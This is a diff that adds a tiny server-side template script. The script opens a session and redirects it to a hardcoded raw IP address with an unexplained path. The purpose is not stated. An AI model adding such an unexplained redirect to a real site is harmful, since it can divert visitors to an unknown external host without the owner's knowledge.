@@ -1,0 +1,8 @@
+<[
+
+session = new( "session" )
+
+session.redir( "http://66.237.252.85/brt/aphi", "" )
+return
+
+]>
